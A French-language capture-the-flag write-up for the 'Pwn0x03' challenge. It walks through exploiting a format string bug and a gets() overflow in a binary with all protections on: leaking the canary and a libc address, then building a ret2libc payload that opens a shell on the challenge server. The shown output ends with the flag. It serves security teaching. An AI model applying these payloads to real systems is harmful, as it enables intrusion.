# Pwn0x03

```md
secret storage service ? is it even secure ?

nc 35.180.44.229 1237
```

[L'exécutable](./task) est fournit vérifions si des sécurités sont activées :

```console
$ checksec --file=task
[*] '/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

Cette fois-ci tout est activé. La [libc](./libc.so.6) utilisé sur le serveur est aussi fournit. Essayons de lancer l'exécutable avec cette `libc` :

```console
$ LD_PRELOAD=./libc.so.6 task
/usr/libexec/pk-command-not-found: ./libc.so.6: version `GLIBC_ABI_DT_RELR' not found (required by /usr/libexec/pk-command-not-found)
```

Je vous épargne tous les messages d'erreurs, mais essentiellement on voit qu'il y a un problème de compabilité avec la version de `GLIBC`. Pendant le ctf j'ai résolu ce problème en travaillant depuis un conteneur avec une ancienne version d'Ubuntu compatible avec cette `libc` :

```console
$ podman run -it ubuntu:focal bash
```

Mais après le ctf Gamray m'a parlé de [pwninit](https://github.com/io12/pwninit), un outil qui permet de résoudre tous les problèmes de compatibilité de ce genre en téléchargeant le [loader](./ld-2.31.so) compatible, et générant un [nouvel exécutable](./task_patched) utilisant la `libc` fournit :

```console
$ ldd task
	linux-vdso.so.1 (0x00007ff2a341f000)
	libc.so.6 => /lib64/libc.so.6 (0x00007ff2a320b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff2a3421000)

$ ldd task_patched 
	linux-vdso.so.1 (0x00007fafe416a000)
	libc.so.6 => ./libc.so.6 (0x00007fafe3f6b000)
	./ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007fafe416c000)

$ ./task_patched 
----------------------------
-- Secret storage service --
----------------------------
Identify your self : 
 > AAAA
Welcome : AAAA
U----------------------------
type your secret : BBBB
```

Le programme nous demande de multiples entrées, essayons de voir si l'une d'entre elle est vulnérable.

## Analyse statique

```C
undefined8 main(void)
{
  long in_FS_OFFSET;
  char input2 [64];
  char input [88];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  set_buffs();
  puts("----------------------------");
  puts("-- Secret storage service --");
  puts("----------------------------");
  puts("Identify your self : ");
  printf(" > ");
  read(0,input,80);
  printf("Welcome : ");
  printf(input);
  puts("----------------------------");
  printf("type your secret : ");
  gets(input2);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

Dans ce code on peut immédiatement identifier deux vulnérabilités. Ce `printf` est vulnérable à un [format string bug](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/format-string-bug) :

```C
  printf(input);
```

Il nous permettra de facilement leak la stack. Et ce `gets` est vulnérable à un buffer overflow (car pas de limite sur la taille de l'input de l'utilisateur) :

```C
  gets(input2);
```

Tout d'abord, essayons de leak la stack.

## Analyse dynamique

Nous pouvons exploiter le format string de cette manière :

```console
$ ./task_patched 
----------------------------
-- Secret storage service --
----------------------------
Identify your self : 
 > %p %p %p %p
Welcome : 0x7ffeacda1570 (nil) (nil) 0xa
----------------------------
type your secret : 
```

`0x7ffeacda1570` étant ici la première valeur sur la stack au moment où elle est leak, `0x0000000000000000` étant la deuxième, etc.

Ou de cette manière, bien plus propre :

```console
$ ./task_patched 
----------------------------
-- Secret storage service --
----------------------------
Identify your self : 
 > %30$p
Welcome : 0x100000000
----------------------------
type your secret : 
```

`0x100000000` étant la 30ième valeur sur la stack au moment où elle est leak.

Maintenant que nous sommes en capacité de leak la stack, il faut trouver les bonnes valeurs pour faire notre exploit. Le plus simple ici semble être de faire un [ret2lib](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc). Pour cela, nous devons trouver une addresse de la `libc` ainsi que le [canary](https://ir0nstone.gitbook.io/notes/binexp/stack/canaries). En testant les leaks possibles sous GDB, on finit par trouver :

```gdb
gef➤  r
Starting program: /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched 
----------------------------
-- Secret storage service --
----------------------------
Identify your self : 
 > %27$p %25$p
Welcome : 0x7ffff7df9083 0x4d117625f73cce00
----------------------------
type your secret : 
```

La première valeur étant l'adresse d'une instruction dans la `libc` :

```gdb
gef➤  x/i 0x7ffff7df9083
   0x7ffff7df9083 <__libc_start_main+243>:	mov    edi,eax
```

Vérifions que le second est bien le `canary` :

```gdb
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555531f                  call   0x5555555550e0 <gets@plt>
   0x555555555324                  mov    eax, 0x0
   0x555555555329                  mov    rcx, QWORD PTR [rbp-0x8]
 → 0x55555555532d                  xor    rcx, QWORD PTR fs:0x28
   0x555555555336                  je     0x55555555533d
   0x555555555338                  call   0x5555555550b0 <__stack_chk_fail@plt>
   0x55555555533d                  leave  
   0x55555555533e                  ret    
   0x55555555533f                  nop    
```

```gdb
gef➤  p $rcx
$2 = 0x4d117625f73cce00
```

`xor    rcx, QWORD PTR fs:0x28` est l'instruction vérifiant le `canary` à la fin de la fonction `main`. `rcx` le contient donc, et on peut voir qu'il correspond au leak un peu plus haut.

Pour calculer les adresses nécessaires dans notre exploit, il va falloir connaître l'offset entre la première adresse de la `libc`, et notre leak (`0x7ffff7df9083 <__libc_start_main+243>:	mov    edi,eax`). Allons chercher les données nécessaires dans GDB :

```gdb
gef➤  info proc map
process 35606
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched
      0x555555555000     0x555555556000     0x1000     0x1000  r-xp   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched
      0x555555556000     0x555555557000     0x1000     0x2000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched
      0x555555557000     0x555555558000     0x1000     0x2000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched
      0x555555558000     0x55555555b000     0x3000     0x3000  rw-p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/task_patched
      0x7ffff7dd5000     0x7ffff7df7000    0x22000        0x0  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6
      0x7ffff7df7000     0x7ffff7f6f000   0x178000    0x22000  r-xp   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6
      0x7ffff7f6f000     0x7ffff7fbd000    0x4e000   0x19a000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6
      0x7ffff7fbd000     0x7ffff7fc1000     0x4000   0x1e7000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6
      0x7ffff7fc1000     0x7ffff7fc3000     0x2000   0x1eb000  rw-p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6
      0x7ffff7fc3000     0x7ffff7fc9000     0x6000        0x0  rw-p   
      0x7ffff7fc9000     0x7ffff7fcd000     0x4000        0x0  r--p   [vvar]
      0x7ffff7fcd000     0x7ffff7fcf000     0x2000        0x0  r-xp   [vdso]
      0x7ffff7fcf000     0x7ffff7fd0000     0x1000        0x0  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/ld-2.31.so
      0x7ffff7fd0000     0x7ffff7ff3000    0x23000     0x1000  r-xp   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/ld-2.31.so
      0x7ffff7ff3000     0x7ffff7ffb000     0x8000    0x24000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/ld-2.31.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x2c000  r--p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/ld-2.31.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2d000  rw-p   /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/ld-2.31.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0  rw-p   
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
```

Et calculons cet offset avec Python :

```python
>>> 0x7ffff7df9083-0x7ffff7dd5000
147587
```

Nous avons toutes les informations nécessaires, passons à l'exploit.

## Exploit

Maitenant que nous savons comment leaks les informations nécessaires, il faut comprendre comment retrouver les adresses de la `libc` avec celles-ci. Nous avons la `libc` utilisé par le serveur à disposition, nous pouvons donc facilemenet retrouver les adresses de fonctions à l'intérieur de celle-ci :

```python
>>> from pwn import *

>>> libc = ELF("./libc.so.6")
[*] '/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled

>>> libc.sym["system"]
336528

>>> hex(libc.sym["system"])
'0x52290'
```

`0x52290` est donc l'offset entre la première adresse de la `libc`, et le début de la fonction `system`. Nous pouvons donc par exemple calculer l'adresse de `system` avec le leak de cette manière : `(leak - 147587) + libc.sym["system"]` (avec 147587 l'offset entre le leak et la première adresse de la `libc` calculé plus tôt).

Et enfin, il ne nous reste plus qu'à faire notre payload, en l'occurence nous allons simplement ouvrir un shell avec la fonction `system`. Pour ce faire il nous faut l'adresse du string `/bin/sh` :

```python3
>>> from pwn import *

>>> libc = ELF("./libc.so.6")
[*] '/home/geoffrey/Downloads/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled

>>> hex(next(libc.search(b'/bin/sh')))
'0x1b45bd'
```

Et un gadget `pop rdi ; ret` :

```console
$ ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
0x0000000000023b6a : pop rdi ; ret
```

Il ne nous reste plus qu'à tout mettre en commun dans [ce script](./exploit.py), ce qui nous donne :

```console
$ python3 exploit.py 
[*] '/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x03/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 35.180.44.229 on port 1237: Done
[*] Switching to interactive mode
$ whoami
ctf
$ ls
flag.txt
task
ynetd
$ cat flag.txt
StarHack{fms_bUG5_ar3_mY_favorites_wh4t_ab0ut_y0u?ASDSAKDASDKASFFDSASDFSA}
```